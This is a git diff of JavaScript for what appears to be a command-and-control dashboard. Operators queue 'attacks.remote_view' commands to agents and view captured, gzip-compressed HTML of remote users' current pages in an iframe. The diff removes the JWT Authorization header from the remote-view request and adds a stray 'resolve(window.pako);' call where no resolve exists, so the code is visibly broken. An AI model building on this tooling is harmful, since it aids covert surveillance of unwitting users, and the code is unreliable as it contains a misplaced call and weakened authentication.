@@ -43,6 +43,8 @@ function initDashboard(agentId) {
 
     // Initialize modals
     initRemoteView();
+
+    resolve(window.pako);
     initCommandHistoryModal();
     
     // Set up refresh interval for pending commands and command history
@@ -656,57 +658,96 @@ function removeCompletedCommandFromHistory(commandID) {
 let remoteViewActive = true;
 let remoteViewInterval = null;
 
+// Fix the remote view button click handler
 function initRemoteView() {
-    // Get modal elements
+    // Modal elements
     const modal = document.getElementById('remote-view-modal');
+    if (!modal) {
+        console.error('Remote view modal element not found');
+        return;
+    }
+    
     const closeBtn = document.querySelector('.modal-close');
-    // Don't try to find this element at initialization time
-    // const remoteViewBtn = document.getElementById('remote-view');
-    const remoteViewPanelBtn = document.getElementById('remote-view-panel');
     const refreshBtn = document.getElementById('refresh-remote-view');
     const stopBtn = document.getElementById('stop-remote-view');
     
-    // Instead of using direct event listener, we'll use event delegation
-    // This will allow us to handle clicks on dynamically created elements
-    document.addEventListener('click', function(event) {
-        // Check if the clicked element is our remote view command
-        if (event.target.closest('.command-item[data-command="attacks.remote_view"]')) {
-            startRemoteView();
-        }
-    });
+    // Remote view command button in the command library
+    const remoteViewBtn = document.querySelector('[data-command="attacks.remote_view"]');
+    if (remoteViewBtn) {
+        remoteViewBtn.addEventListener('click', function() {
+            // First make sure the modal exists
+            if (!modal) {
+                console.error('Remote view modal not found');
+                return;
+            }
+            
+            // Open the modal
+            console.log('Opening remote view modal from command button');
+            modal.style.display = 'block';
+            
+            // Queue the command
+            queueCommand('remote_view.start');
+            
+            // Fetch initial data after a delay
+            setTimeout(fetchRemoteViewData, 1500);
+            
+            // Start the refresh interval
+            if (remoteViewInterval) {
+                clearInterval(remoteViewInterval);
+            }
+            remoteViewInterval = setInterval(fetchRemoteViewData, 5000);
+        });
+    } else {
+        console.warn('Remote view button not found in command library');
+    }
     
-    // Open modal when clicking the Remote View Panel button
-    if (remoteViewPanelBtn) {
-        remoteViewPanelBtn.addEventListener('click', function() {
-            openRemoteViewModal();
+    // Remote view panel button (the small icon that appears after starting remote view)
+    const remoteViewPanel = document.getElementById('remote-view-panel');
+    if (remoteViewPanel) {
+        remoteViewPanel.addEventListener('click', function() {
+            console.log('Opening remote view modal from panel button');
+            modal.style.display = 'block';
+            fetchRemoteViewData();
         });
     }
     
-    // Close modal when clicking X
+    // Close button
     if (closeBtn) {
         closeBtn.addEventListener('click', function() {
+            console.log('Closing remote view modal');
             modal.style.display = 'none';
         });
     }
     
-    // Close modal when clicking outside
+    // Close when clicking outside
     window.addEventListener('click', function(event) {
-        if (modal && event.target === modal) {
+        if (event.target === modal) {
             modal.style.display = 'none';
         }
     });
     
-    // Refresh remote view
+    // Refresh button
     if (refreshBtn) {
         refreshBtn.addEventListener('click', function() {
-            startRemoteView();
+            console.log('Manually refreshing remote view');
+            fetchRemoteViewData();
         });
     }
     
-    // Stop remote view
+    // Stop button
     if (stopBtn) {
         stopBtn.addEventListener('click', function() {
-            stopRemoteView();
+            console.log('Stopping remote view');
+            if (remoteViewInterval) {
+                clearInterval(remoteViewInterval);
+                remoteViewInterval = null;
+            }
+            
+            queueCommand('remote_view.stop');
+            document.getElementById('remote-view-iframe').srcdoc = `
+                <html><body>
+                    <p>Remote view stopped.</p>
+                </body></html>`;
         });
     }
 }
@@ -808,32 +849,89 @@ function stopRemoteView() {
 }
 
 function fetchRemoteViewData() {
-    const agentId = document.getElementById('agent-id').textContent;
+    if (!currentAgentId) return;
     
-    // Use the dedicated remote view endpoint instead of command history
-    fetch(`/commands/agent/${agentId}/remote_view`, {
-        headers: {
-            'Authorization': 'Bearer ' + localStorage.getItem('jwt_token')
-        }
-    })
-    .then(response => {
-        if (!response.ok) {
-            throw new Error('Failed to fetch remote view data');
-        }
-        return response.json();
-    })
-    .then(data => {
-        if (data && data.remoteView) {
-            displayRemoteViewResult({ result: data.remoteView });
-        } else {
-            console.log('No remote view data available');
-        }
-    })
-    .catch(error => {
-        console.error('Error fetching remote view data:', error);
-    });
+    fetch(`/commands/agent/${currentAgentId}/remote_view`)
+        .then(response => {
+            if (!response.ok) {
+                throw new Error(`HTTP error ${response.status}`);
+            }
+            return response.json();
+        })
+        .then(data => {
+            console.log('Remote view data received');
+            processRemoteViewData(data);
+        })
+        .catch(error => {
+            console.error('Error fetching remote view data:', error);
+            document.getElementById('remote-view-iframe').srcdoc = `
+                <html><body>
+                    <p style="color:red">Error loading remote view: ${error.message}</p>
+                </body></html>`;
+        });
 }
 
+
+function processRemoteViewData(data) {
+    try {
+        console.log('Remote view data received:', data);
+        
+        // Check if we have the expected structure
+        if (!data || !data.remoteView) {
+            throw new Error('Invalid remote view data structure');
+        }
+        
+        // Extract the actual remote view data
+        const remoteViewData = data.remoteView;
+        
+        // Check if we have HTML content
+        if (!remoteViewData.html) {
+            throw new Error('No HTML content in remote view data');
+        }
+        
+        const htmlContent = remoteViewData.html;
+        console.log('HTML content found, length:', htmlContent.length);
+        
+        // Update metadata first
+        document.getElementById('remote-view-url').textContent = 'URL: ' + (remoteViewData.url || 'Unknown');
+        document.getElementById('remote-view-timestamp').textContent = 'Timestamp: ' + 
+            (remoteViewData.timestamp || new Date().toLocaleString());
+        
+        // The HTML is base64 encoded and gzip compressed (starts with H4sI)
+        try {
+            // First decode from base64
+            const base64Decoded = atob(htmlContent);
+            console.log('Base64 decoded, length:', base64Decoded.length);
+            
+            // Convert binary string to Uint8Array for pako
+            const bytes = new Uint8Array(base64Decoded.length);
+            for (let i = 0; i < base64Decoded.length; i++) {
+                bytes[i] = base64Decoded.charCodeAt(i);
+            }
+            
+            // Decompress with pako (it's definitely gzipped - H4sI header)
+            console.log('Decompressing with pako...');
+            const decompressed = pako.inflate(bytes, { to: 'string' });
+            console.log('Decompression successful, final HTML length:', decompressed.length);
+            
+            // Update the iframe with the decompressed HTML
+            const iframe = document.getElementById('remote-view-iframe');
+            iframe.srcdoc = decompressed;
+            
+            console.log('Remote view updated successfully');
+            
+        } catch (error) {
+            console.error('Error processing HTML content:', error);
+            updateRemoteViewStatus('Error processing HTML: ' + error.message);
+        }
+        
+    } catch (error) {
+        console.error('Error processing remote view data:', error);
+        updateRemoteViewStatus('Error: ' + error.message);
+    }
+}
+
+// Then modify your displayRemoteViewResult function:
 function displayRemoteViewResult(commandResult) {
     try {
         // Parse the result if it's a string
@@ -842,19 +940,82 @@ function displayRemoteViewResult(commandResult) {
             resultData = JSON.parse(resultData);
         }
         
-        // Update the iframe with the HTML content
+        // First check if we have HTML content
         if (resultData && resultData.html) {
-            const iframe = document.getElementById('remote-view-iframe');
-            iframe.srcdoc = resultData.html;
+            let htmlContent = resultData.html;
             
-            // Update metadata
-            document.getElementById('remote-view-url').textContent = 'URL: ' + (resultData.url || 'Unknown');
-            document.getElementById('remote-view-timestamp').textContent = 'Timestamp: ' + 
-                (resultData.timestamp || new Date().toLocaleString());
+            // Check if the content is compressed
+            const isCompressed = resultData.isCompressed === true || 
+                                (resultData.compressionMethod && 
+                                 (resultData.compressionMethod.includes('gzip') || 
+                                  resultData.compressionMethod.includes('base64')));
+            
+            // Process based on compression status
+            if (isCompressed) {
+                // Load pako if needed
+                (async function() {
+                    try {
+                        // Make sure pako is loaded
+                        await loadPako();
+                        
+                        console.log('Decompressing HTML content...');
+                        // Decode base64
+                        const base64Decoded = atob(htmlContent);
+                        
+                        // Check if we need to decompress with gzip
+                        if (resultData.compressionMethod && resultData.compressionMethod.includes('gzip')) {
+                            // Convert the binary string to Uint8Array for pako
+                            const byteArray = new Uint8Array(base64Decoded.length);
+                            for (let i = 0; i < base64Decoded.length; i++) {
+                                byteArray[i] = base64Decoded.charCodeAt(i);
+                            }
+                            
+                            // Decompress using pako
+                            const decompressed = pako.inflate(byteArray, { to: 'string' });
+                            htmlContent = decompressed;
+                        } else {
+                            // If only base64 encoded (not gzipped)
+                            htmlContent = base64Decoded;
+                        }
+                        
+                        // Update the iframe with the decompressed HTML
+                        updateRemoteViewIframe(htmlContent, resultData);
+                        
+                    } catch (error) {
+                        console.error('Error decompressing remote view data:', error);
+                        updateRemoteViewStatus('Error decompressing HTML data. See console for details.');
+                    }
+                })();
+            } else {
+                // Content is not compressed, use as-is
+                updateRemoteViewIframe(htmlContent, resultData);
+            }
+        } else {
+            console.error('No HTML content in remote view data:', resultData);
+            updateRemoteViewStatus('No HTML content found in remote view data');
         }
     } catch (error) {
         console.error('Error displaying remote view result:', error);
-        updateRemoteViewStatus('Error parsing remote view data');
+        updateRemoteViewStatus('Error parsing remote view data: ' + error.message);
+    }
+}
+
+// Separate function to update the iframe with HTML content
+function updateRemoteViewIframe(htmlContent, resultData) {
+    const iframe = document.getElementById('remote-view-iframe');
+    iframe.srcdoc = htmlContent;
+    
+    // Update metadata
+    document.getElementById('remote-view-url').textContent = 'URL: ' + (resultData.url || 'Unknown');
+    document.getElementById('remote-view-timestamp').textContent = 'Timestamp: ' + 
+        (resultData.timestamp || new Date().toLocaleString());
+        
+    console.log('Remote view updated successfully');
+    
+    // If you want to display compression stats
+    if (resultData.originalSize && resultData.compressedSize) {
+        const compressionRatio = ((resultData.originalSize - resultData.compressedSize) / resultData.originalSize * 100).toFixed(1);
+        console.log(`Compression: ${compressionRatio}% reduction (${resultData.compressedSize} bytes vs original ${resultData.originalSize} bytes)`);
     }
 }
 
